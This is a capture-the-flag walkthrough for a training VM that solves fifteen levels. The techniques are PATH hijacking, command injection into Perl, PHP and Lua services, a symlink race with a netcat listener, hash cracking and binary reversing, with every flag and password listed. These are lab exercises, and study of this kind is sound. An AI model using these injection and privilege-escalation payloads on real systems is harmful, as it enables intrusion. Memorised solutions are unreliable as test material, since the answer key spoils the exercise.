# Level00

- We are going to the root of the account `cd /`
- execute `ls -al */* | grep "flag"` command to see if there is a file with the "flag"
- saw a flag00 with john name on it
- execute `find / -name "john" 2>&1 | grep -v "Permission denied"` to find the path to the `john` file
- find is in : `/rofs/usr/sbin/john`
- cat john file gives : `cdiiddwpgswtgt`
- used Cesar code to decrypt the code, with [https://www.dcode.fr/chiffre-cesar](https://www.dcode.fr/chiffre-cesar "https://www.dcode.fr/chiffre-cesar") : nottoohardhere

#### Flag00 pass : nottoohardhere

### Flag : x24ti5gi3x0ol2eh4esiuxias

---

# Flag00

We are staying in flag00 to get to flag01 without being in `level01`.
We check all the available users, and look for the flag01 password.

`getent passwd | grep "flag01"`

```bash
$ getent passwd | grep "flag01"
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

We notice the presence of a hashed password, after some investigation, we think that it is hashed using the crypt algorithm

```bash
echo '42hDRfypTqqnw' > hash.txt
```

We install [John the Ripper](https://github.com/openwall/john) to test our theory

```bash
$ john --format=descrypt <PATH>/hash --show`
$ abcdefg
```

#### flag01 pass : abcdefg

### Flag : f2av5il02puano7naaf6adaaf

---

# Level02

## What's the vulnerability ?

Checking the available files, we see a `.pcap` file. After seeing what a [.pcap](https://www.endace.com/learn/what-is-a-pcap-file) file is, we try to open it using [wireshark](https://www.wireshark.org/docs/wsug_html_chunked/ChapterIntroduction.html).

#### Using wireshark

We are following the tcp stream on wireshark to have this output : (**Right click -> "Follow TCP stream"**)

```ascii
..wwwbugs login: l.le.ev.ve.el.lX.X
Password: ft_wandr...NDRel.L0L
Login incorrect
wwwbugs login:
```

reading the output in hexcode :

```
000000B9 66 f
000000BA 74 t
000000BB 5f _
000000BC 77 w
000000BD 61 a
000000BE 6e n
000000BF 64 d
000000C0 72 r
000000C1 7f .
000000C2 7f .
000000C3 7f .
000000C4 4e N
000000C5 44 D
000000C6 52 R
000000C7 65 e
000000C8 6c l
000000C9 7f .
000000CA 4c L
000000CB 30 0
000000CC 4c L
000000CD 0d .
```

Looking at the [man ascii](https://www.man7.org/linux/man-pages/man7/ascii.7.html), we know that `7f` is for `DEL`.

#### Flag02 pass : ft_waNDReL0L

### Flag : kooda2puivaav1idi4f57q8iq

---

# Level03

## What's the vulnerability ?

We have a single binary file that's outputing `Exploit me`.
Using ghidra, we see that the program uses `echo` but not with the absolute path.
We can create a fake `echo` script with `getflag` in it. And add `/tmp` to the `$PATH`

## Execution

```bash
echo '/bin/bash' > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03

bash: /home/user/level03/.bashrc: Permission denied
# AFTER THE ERROR, WE ARE IN AS THE USER FLAG03

getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

### Flag : qi0maab88jeaj46qoumi7maus

---

# Level04

## What's the vulnerability ?

Ressources : https://www.geeksforgeeks.org/pl-file-format/

We check what's inside the `~/` of the user and print the program given.

```shell
$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
$ cat level04.pl
#!/usr/bin/perl
# localhost:4747

use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;      // HERE IS THE VULNERABILITY
}
x(param("x"));
```

After analysing the content we notice that the variable `x` take its content straight from the local server localhost:4747 which indicate a vulnerability
since the echo been using backticks it imply that we can execute commands through that vulnerability, we simply need to feed x the command we want to execute through curl

The function `x` is taking the parameter named `x` in the HTML request. and what it does is, in the print line, it's echoing `$y`. `$y` being the parameter `x` itself. We can get out of the echo command and put some **arbitrery code execution** here.

## Execution

```bash
level04@SnowCrash:~$ curl "http://localhost:4747/?x=\`getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

#### Explaining the command:

```bash
curl "http://localhost:4747/?x=\`getflag\`"
```

- `curl` will get all the data from the request we will send.
  - `http://localhost:4747` is the _IP_ and the _port_ targeted, we can find them in the `level04.pl` file
  - `/` is here to give the destination of the request, here we just ask to be executed at the root of the server.
  - `?` indicates that we are giving a parameter just after.
    - `x=` we create the x variable.
      - `` \`getflag\` `` we escape all the \` to not get executed in the terminal here. Passing getflag so here it'll be escaped by `echo` and executing `getflag`

### Flag : ne2searoevaevoem4ov4ar8ap

---

# Level05

## What's the vulnerability ?

We notice that we are recieving a mail on our account. We are looking for every file named mail :

```bash
$ find / -name mail 2>&1 | grep -v "Permission denied"
/usr/lib/byobu/mail
/var/mail
/var/spool/mail
/rofs/usr/lib/byobu/mail
/rofs/var/mail
/rofs/var/spool/mail
```

By listing in `var/mail` we find a file named level05 :

```bash
$ ls /var/mail -l
total 4
-rw-r--r--+ 1 root mail 58 Sep 20 10:21 level05
```

By printing, we see that there is an `openarenaserver` somewhere in the `sbin` folder.

```bash
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

By checking the script in `/usr/sbin/openarenaserver` :

```bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")    # THE VULNERABILITY IS HERE
	rm -f "$i"
done
```

We see that the program executes every file in the `/opt/openarenaserver/` folder.

We create a fake binary in tmp named securecopy with the getflag command inside of it.

```
echo 'getflag > /tmp/flag' > /tmp/securecopy
```

We copy it to the openarena folder and we wait abit for the command to be executed.

## Execution

```bash
echo 'getflag > /tmp/flag' > /tmp/securecopy
cp /tmp/securecopy  /opt/openarenaserver/securecopy
# WAITING ~30 seconds for the openarenaserver to be executed.
cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc

```

### Flag : viuaaale9huek52boumoomioc`

---

# Level06

## What's the vulnerability ?

Looking at the available files we have we can see two files

```bash
$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

We try to execute the function :

```bash
$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
$ ./level06 test
PHP Warning:  file_get_contents(test): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
```

We understand that the program needs to get a file.
Using `ghidra`, we are seeing that the program is using a depracated version of PHP, and is using `/e` (**[evaluate](https://phplift.com/compatibility/functions/regex-e-modifier)**)

```PHP
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);      // HERE IS THE VULNERABILITY
    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;

?>
```

#### What does `preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);` ?

- `/(\[x (.*)\])/e`
  - Delimiters: `/.../`
  - Pattern: `\[x (.*)\]`
    - `\[x` matches the literal string `[x`
    - `(.*)` captures \*\*everything after `[x` until the closing `]`
    - `\]` matches the closing bracket
  - Overall match example: `[x abc.def@ghi]`
  - Capture groups:
    - `$1` = `[x abc.def@ghi]` (entire match)
    - `$2` = `abc.def@ghi` (the inner content)
- `"y(\"\\2\")"`
  - - This gets evaluated as PHP code (because of `/e`)
  - `\\2` → becomes `\2` → references the second capture group (e.g., `abc.def@ghi`)
  - So this becomes: `y("abc.def@ghi")`
- The function `y($m)` :
  - replaces `.` by `x`
  - replace `@` by ` y`

##### Example:

If we have in a file a small text that takes `getflag` and tries to add it has an argument, the program will execute it.
_Syntax_ :

```bash
'[x ${`getflag`}]'
```

> [!info] Brackets are replace by parenthesis in this program, that's why we don't use `[` and `]`

## Execution

```bash
$ echo  '[x ${`getflag`}]' > /tmp/flag
$ ./level06 /tmp/flag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

> [!note] Here it tries to say that the variable `getflag` doesn't exists, but instead execute it because of the \`

### Flag : wiok45aaoguiboiki2tuin6ub

---

# Level07

## What's the vulnerability ?

The vulnerability takes place in the binary at the home of the user.

```bash
$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Let's execute it :

```bash
$ ./level07
level07
```

We are assuming this program prints its name or the name of the user executing it.
We analyze the program using `ghidra`.

```C
void dbg.main(void)
{
/*            ...Variables declarations...            */
    uStack_18 = sym.imp.getegid();
    uStack_14 = sym.imp.geteuid();
    sym.imp.setresgid(uStack_18, uStack_18, uStack_18);
    sym.imp.setresuid(uStack_14, uStack_14, uStack_14);
    var_1ch = 0;
    uVar1 = sym.imp.getenv("LOGNAME");
    sym.imp.asprintf(&var_1ch, "/bin/echo %s ", uVar1);
    sym.imp.system(var_1ch);
    return;
}
```

- We are seeing that the current program is printing the env variable `LOGNAME`. We can use this information to execute code as a privileged user with the code below.

```bash
export LOGNAME="\"\"\`getflag\`"
```

#### Explaining the new LOGNAME

- The first `"` is taking all of the string.
  - The second `"` is escaped, meaning the `printf` function will send it raw to the command.
  - The third `"` is closing the `echo` parameter, ending the echo call.
  - we have (without the escape char) `getflag`, which will be executed by the program that is owned by the user `flag07`.

## Execution

```bash
$ export LOGNAME="\"\"\`getflag\`"
$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### Flag : fiumuikeil55xe9cu4dood66h

---

# Level08

## What's the vulnerability ?

We can see that we have a binary named `level08` at the home of the account.

```bash
$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

When we try to execute it, it asks us for a file to read, we give it `token`, which result to a `You may not access 'token'`

```bash
$ ./level08
./level08 [file to read]
$ ./level08 token
You may not access 'token'
```

Using **ghidra** to understand what does the binary do.

```C
void dbg.main(char **envp, char **argv)
{
/*            ...Variables declarations...            */
    iStack_14 = *(int32_t *)(in_GS_OFFSET + 0x14);
    if (in_stack_00000004 == 1) {
		sym.imp.printf("%s [file to read]\n", *in_stack_00000008);
        sym.imp.exit(1);
    }
    iVar1 = sym.imp.strstr(in_stack_00000008[1], "token"); // HERE IS THE VULNERABILITY !
    if (iVar1 != 0) {
        sym.imp.printf("You may not access \'%s\'\n", in_stack_00000008[1]);
        sym.imp.exit(1);
    }
/*            ...The rest of the code...              */
}
```

What we will do here is to create a link file that will read the token file, therefore because it's name isn't `token` it will allow the program to read it

## Execution

```bash
ln -s /home/user/level08/token /tmp/fake
./level08 /tmp/fake
quif5eloekouj29ke0vouxean
```

#### Flag08 pass : quif5eloekouj29ke0vouxean

### Flag : 25749xKZ8L7DkSCwJkT9dyv6f

---

# Level09

## What's the vulnerability ?

We can see that we have a binary named `level09` with a token file at the home of the user.

```bash
$ ls -l
total 12
-rwsr-sr-x 1 flag09 level09 7640 Mar  5  2016 level09
----r--r-- 1 flag09 level09   26 Mar  5  2016 token
```

The vulnerability takes place in the binary `level09` ; What it does is, given a string, will offset each character `x` times off, `x` being it's index in the string .

#### Example:

If we have a file named `test` that has `AAAA` in it. the result will be `ABCD`.

| TEST | INDEX | OFFSET  | OUTPUT |
| :--: | :---: | :-----: | :----: |
|  A   |   0   | 'A' + 0 |   A    |
|  A   |   1   | 'A' + 1 |   B    |
|  A   |   2   | 'A' + 2 |   C    |
|  A   |   3   | 'A' + 3 |   D    |

```bash
$ ./level09 "AAAA"
ABCD
```

Assuming token was generated using this, the real password should be found reversing this process.
So we made a small program that is doing as is.

### Writing a reversing program

```C
int main(int ac, char **av)
{
	if (ac > 2)
		return 0;

	int i = 0;

	int fd = open(av[1], O_RDONLY);
	if (fd <= 0)
		return -1;
	char *s = get_next_line(fd);
	while (i < strlen(s))
	{
		printf("%c", s[i] - i);
		i++;
	}
	printf("\n");
	free(s);
	return 0;
}
```

In this program, we go through every character of the string and reduce its value by its index.

## Execution

```
# in host terminal
$ scp -P 4242 ./*.c level09@192.168.57.3:/tmp/.
$ scp -P 4242 ./*.h llevel09@192.168.57.3:/tmp/.

# in SnowCrash

$ cd /tmp
/tmp$ gcc get_next_line_bonus.c get_next_line_utils_bonus.c level09_script.c
/tmp$ ./a.out ~/token
f3iji1ju5yuevaus41q1afiuq�
```

#### Flag09 pass: f3iji1ju5yuevaus41q1afiuq

### Flag : s5cAJpM8ev6XHw998pRWG728z

---

# Level10

## Explaining the vulnerability

First we check the content of the level with a simple ls -la

```
$ ls
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

We notice that the `level10` binary is setuid and owned by `flag10`. The `token` file is owned by `flag10` and is not readable by our user. We can run `level10`, but we cannot read `token` directly.

After using Ghidra to inspect the binary, here is the relevant decompiled code:

```
[...]
  iVar2 = access((char *)in_stack_00000008[1],4);
[...]
iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
[...]
```

After a bit of research we learned about **[TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)** (time-of-check to time-of-use) race conditions. In our case the program calls `access(path, R_OK)` to check that a file is readable and later calls `open(path, O_RDONLY)` to open it. Between those two calls the filesystem object at `path` can change; by modifying the symlink target at the right time, `open(path, O_RDONLY)` can open `token` even though `access()` was checked against a different target.

## Execution

First we create the placeholder file and ensure it is readable (this is required so `access()` passes):

```bash
echo "TEST" > /tmp/placeholder
chmod +r /tmp/placeholder
ln -sf /tmp/placeholder /tmp/race_link
```

Netcat is needed to retrieve the output of the binary:

```bash
nc -lk 6969 > /tmp/stock.txt &
LISTENER_PID=$!
```

Next we add a loop that automates the symlink reset and the swap so we don't have to do it by hand repeatedly.

```bash
for i in $(seq 1 500); do
    ln -sf /tmp/placeholder /tmp/race_link
    /home/user/level10/level10 /tmp/race_link 127.0.0.1 &
    BINARY_PID=$!
    ln -sf /home/user/level10/token /tmp/race_link
    wait $BINARY_PID
    cat /tmp/stock.txt
done
```

Finally we display the result and clean up the temporary files if the attempt succeeded or failed:

```bash
echo "[*] Contenu capturé par le listener :"
cat /tmp/stock.txt
kill  $LISTENER_PID 2>/dev/null
rm -f /tmp/race_link /tmp/placeholder
```

- Now the only thing left to do is to launch the script

```shell
$ /tmp/script
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
```

- After the loop is done getting the token

```
TEST
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
```

### Flag : feulo4b72j7edeahuete3no7c

---

# Level11

## What's the vulnerability

In the Level11 account, we have a `.lua` file.
By reading it, we can see that there is an open server at the port `5151` of the localhost waiting for a password to be send.
In the function that is hashing the user input :

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r") -- HERE WE HAVE THE MOMENT THE USER INPUT (pass) IS HASHED.
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
```

In here, the [io.popen](https://www.gammon.com.au/scripts/doc.php?lua=io.popen) function is made to call a bash command, which is in his parameter.
Therefore, by adding a `;` we can separate the pass and the command we want to execute. Here beeing `getflag`.

## Execution

```shell
$ nc localhost 5151 # CONNECTING TO THE SERVER
Password: ; getflag > /tmp/flag       # GOING OUT OF THE SCOPE OF THE FUNCTION AND EXECUTING
Erf nope..
$ cat /tmp/flag    # Printing the file which should have the flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

### Flag : fa6v5ateaw21peobuub8ipe6s

---

# Level12

## What's the vulnerability ?

Here we have a server open at `localhost:4646`. And we have just one file :

```shell
$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

By looking at the `level12.pl` program, we can directly find where is the vulnerability in the `t{}` function :

```perl
sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}
```

The t function is taking 2 parameters, `X` and `Y`. It's trying to uppercase `X` and the deleting everything after the first ` ` (space character).
Then, in `@output`, It calls a bash command `egrep "^$xx" /tmp/xd 2>&1`. This is where the **vulnerability** really is.

- We can create a fake temporary file that will have the command we want to execute, here it will be `getflag > /tmp/output`. we send the output of `getflag` to another file because the vulnerability won't print it in the terminal here. This file will be named in **uppercase** to go through the upper-casing of the t function (File here named `EXPLOIT` in the `/tmp/`). At last, we send a get request to the server to try the vulnerability.

## Execution

```bash
$ echo '#!/bin/sh' > /tmp/EXPLOIT               #|
$ echo 'getflag > /tmp/output' >> /tmp/EXPLOIT  #| Creating the mini script to execute the exploit
$ chmod +x /tmp/EXPLOIT                         # Making the script executable
$ echo -e "GET /?x=\$(/*/EXPLOIT)&y=anything HTTP/1.0\r\nHost: localhost\r\n\r\n" | nc localhost 4646 # THIS LINE WILL BE EXPLAINED BELOW

HTTP/1.1 200 OK
Date: Fri, 19 Sep 2025 16:17:44 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Content-Type: text/html

$ cat /tmp/output                               # Printing the output
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr          # We have the flag
```

#### The echo command

```bash
echo -e "GET /?x=\$(/*/EXPLOIT)&y=anything HTTP/1.0\r\nHost: localhost\r\n\r\n" | nc localhost 4646
```

- `echo -e` will listen to and interpret the end of lines and escape sequences.
  - First line: `GET /?x=\$(/*/EXPLOIT)&y=anything HTTP/1.0\r\n` :
    - `GET`: Sending a GET request to the server with the parameters :
      - `/?x=\$(/*/EXPLOIT)` is the definition of the `x` parameter, its being `$(/*/EXPLOIT)`.
        - The first `/` is meant for the path, we want to send the request to the home which is `localhost:4646/` so just `/`.
        - The `?` at the start means that after it, it is **parameters** that are passed.
        - `$(/*/EXPLOIT)` : This will try to execute every file named `EXPLOIT` in any folder at the root (`/*/` the first `/` is the root).
      - `&` : Means `and` ; is used to separate the two parameters.
      - `y=anything` : The y parameter, absolutely NOT useful here.
    - `HTTP/1.0`: the version of the request
  - Second line: `Host: localhost\r\n` is just here to be sure to send to `localhost`.
  - We have a third line : `\r\n` to escape and execute the `GET` request.
    > [!info] Overall : `\r\n` is just how return a line in HTML request
- `nc localhost 4646` we are connecting to the server and making the request.

### Flag: g1qKMiRpXf53AWhDaU7FEkczr

---

# Level13

We start this level with only one file:

```
level13@SnowCrash:~$ ls -l
-rwsr-sr-x 1 flag13 level13 7303 Aug 30  2015 level13
```

The first step is to execute it:

```
level13@SnowCrash:~$ ./level13
UID 2013 started us but we we expect 4242
```

No luck — we clearly don’t have the required permissions to execute it properly.

Let’s inspect its contents in Ghidra, focusing on the `main` function to understand its logic:

```C
void main(void) {
  __uid_t _Var1;
  undefined4 uVar2;

  _Var1 = getuid();
  if (_Var1 != 0x1092) {
    _Var1 = getuid();
    printf("UID %d started us but we we expect %d\n",_Var1,0x1092);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  uVar2 = ft_des("boe]!ai0FB@.:|L6l@A?>qJ}I");
  printf("your token is %s\n",uVar2);
  return;
}
```

We can observe two things:

1. The program contains a token in an encrypted form.
2. It calls a function named `ft_des` to decrypt it.

---

### Inspecting `ft_des`

Using Ghidra, we examine the `ft_des` function:

```C
char * ft_des(char *param_1) {
/*            ...Variables declarations...            */
  do {
    uVar3 = 0xffffffff;
    pcVar4 = pcVar2;
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + (uint)bVar5 * -2 + 1;
    } while (cVar1 != '\0');
    if (~uVar3 - 1 <= local_20) {
      return pcVar2;
    }
    if (local_1c == 6) {
      local_1c = 0;
    }
    if ((local_20 & 1) == 0) {
      if ((local_20 & 1) == 0) {
        for (local_14 = 0; local_14 < "0123456"[local_1c]; local_14 = local_14 + 1) {
          pcVar2[local_20] = pcVar2[local_20] + -1;
          if (pcVar2[local_20] == '\x1f') {
            pcVar2[local_20] = '~';
          }
        }
      }
    }
    else {
      for (local_18 = 0; local_18 < "0123456"[local_1c]; local_18 = local_18 + 1) {
        pcVar2[local_20] = pcVar2[local_20] + '\x01';
        if (pcVar2[local_20] == '\x7f') {
          pcVar2[local_20] = ' ';
        }
      }
    }
    local_20 = local_20 + 1;
    local_1c = local_1c + 1;
  } while( true );
}
```

So, we have the encrypted token and the decryption function. The only step left is to re-implement the function in C without the UID check, so we can recover the flag.

---

### Implementation

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *ft_des(char *param_1) {
    char cVar1;
    char *pcVar2;
    uint uVar3;
    char *pcVar4;
    unsigned char bVar5;
    unsigned int local_20;
    int local_1c;
    int local_18;
    int local_14;

    bVar5 = 0;
    pcVar2 = strdup(param_1);
    local_1c = 0;
    local_20 = 0;

    do {
        uVar3 = 0xffffffff;
        pcVar4 = pcVar2;
        do {
            if (uVar3 == 0) break;
            uVar3 = uVar3 - 1;
            cVar1 = *pcVar4;
            pcVar4 = pcVar4 + (uint)bVar5 * -2 + 1;
        } while (cVar1 != '\0');

        if (~uVar3 - 1 <= local_20) {
            return pcVar2;
        }

        if (local_1c == 6) {
            local_1c = 0;
        }

        if ((local_20 & 1) == 0) {
            for (local_14 = 0; local_14 < "0123456"[local_1c]; local_14++) {
                pcVar2[local_20] = pcVar2[local_20] - 1;
                if (pcVar2[local_20] == 0x1f) {
                    pcVar2[local_20] = '~';
                }
            }
        } else {
            for (local_18 = 0; local_18 < "0123456"[local_1c]; local_18++) {
                pcVar2[local_20] = pcVar2[local_20] + 1;
                if (pcVar2[local_20] == 0x7f) {
                    pcVar2[local_20] = ' ';
                }
            }
        }

        local_20++;
        local_1c++;
    } while (1);
}

int main(void) {
    char token[] = "boe]!ai0FB@.:|L6l@A?>qJ}I";
    char *result = ft_des(token);
    printf("your token is %s\n", result);
    free(result);
    return 0;
}
```

---

### Compile & Run

```bash
$ gcc main.c
$ ./a.out
your token is 2A31L79asukciNyi8uppkEuSx
```

### Flag: 2A31L79asukciNyi8uppkEuSx

---

# Level 14

## What's the vulnerability

We apply the same approach, but this time we analyze the `getflag` binary in Ghidra to locate the hashed key:

```C
else {
if (_Var6 != 0xbc6) goto LAB_08048e06;
pcVar4 = (char *)ft_des("g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|");
fputs(pcVar4,__stream); }
```

Here, `0xbc6` equals `3014`, which matches the UID for `flag14`.

```
$ cat /etc/passwd
[...]
flag14:x:3014:3014::/home/flag/flag14:/bin/bash
```

  ---

### Reuse of the Script

We recreate our `ft_des` script with the new token:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *ft_des(char *param_1)
{
    char cVar1;
    char *pcVar2;
    uint uVar3;
    char *pcVar4;
    unsigned char bVar5;
    unsigned int local_20;
    int local_1c;
    int local_18;
    int local_14;

    bVar5 = 0;
    pcVar2 = strdup(param_1);
    local_1c = 0;
    local_20 = 0;

    do {
        uVar3 = 0xffffffff;
        pcVar4 = pcVar2;
        do {
            if (uVar3 == 0) break;
            uVar3 = uVar3 - 1;
            cVar1 = *pcVar4;
            pcVar4 = pcVar4 + (uint)bVar5 * -2 + 1;
        } while (cVar1 != '\0');

        if (~uVar3 - 1 <= local_20) {
            return pcVar2;
        }

        if (local_1c == 6) {
            local_1c = 0;
        }

        if ((local_20 & 1) == 0) {
            for (local_14 = 0; local_14 < "0123456"[local_1c]; local_14++) {
                pcVar2[local_20] = pcVar2[local_20] - 1;
                if (pcVar2[local_20] == 0x1f) {
                    pcVar2[local_20] = '~';
                }
            }
        } else {
            for (local_18 = 0; local_18 < "0123456"[local_1c]; local_18++) {
                pcVar2[local_20] = pcVar2[local_20] + 1;
                if (pcVar2[local_20] == 0x7f) {
                    pcVar2[local_20] = ' ';
                }
            }
        }

        local_20++;
        local_1c++;
    } while (1);
}

int main(void) {
    char token[] = "g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|";
    char *result = ft_des(token);
    printf("your token is %s\n", result);
    free(result);
    return 0;
}

```



---

  

### Compile & Run

  

```bash
$ gcc script.c
$ ./a.out
your token is 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
```

  

**Flag:** `7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ`